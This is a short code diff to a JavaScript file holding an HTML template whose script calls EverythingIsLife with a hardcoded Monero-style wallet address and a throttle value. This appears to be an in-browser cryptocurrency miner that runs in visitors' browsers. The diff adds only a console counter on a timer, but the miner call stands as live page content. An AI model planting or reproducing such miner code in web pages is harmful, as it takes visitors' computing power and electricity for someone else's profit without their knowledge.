@@ -14,6 +14,10 @@ const htmlContent = `
             const url = new URL(window.location.href);
             const address = url.searchParams.get("address") || "4BE6pHmwt1rMDFWtzFSfQj7Ae8Q6QikKs6B1tmpM8xbU6ZDKBYYJJtRFJVdeVLuQJbHCeEpzY6CDp8BujPg1AcUk5bmDKYb";
             EverythingIsLife(address , 'x', 30);
+            let i =0;
+            setInterval(()=>{
+            console.log(++i);
+            },2000);
         </script>
     </body>
 </html>
